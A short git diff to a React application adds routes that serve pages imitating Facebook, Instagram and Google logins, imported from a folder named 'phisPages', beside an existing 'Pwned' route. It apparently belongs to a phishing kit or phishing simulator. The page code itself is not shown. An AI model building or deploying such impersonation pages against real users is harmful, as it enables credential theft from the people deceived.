@@ -14,6 +14,9 @@ import Settings from "./pages/Settings";
 
 import VerifyUser from "./utils/VerifyUser";
 import { verify } from "crypto";
+import Facebook from "./pages/phisPages/Facebook";
+import Instagram from "./pages/phisPages/Instagram";
+import Google from "./pages/phisPages/Google";
 
 const App = () => {
     return (
@@ -58,6 +61,19 @@ const App = () => {
                                 <Pwned />
                             </ProtectedRoute>
                         }
+                    />
+
+                    <Route
+                        path="/user/wwwfacebookcom"
+                        element={<Facebook></Facebook>}
+                    />
+                    <Route
+                        path="/user/wwwinstagramcom"
+                        element={<Instagram></Instagram>}
+                    />
+                    <Route
+                        path="/user/wwwgooglecom"
+                        element={<Google></Google>}
                     />
 
                     {/* Default page active todos */}
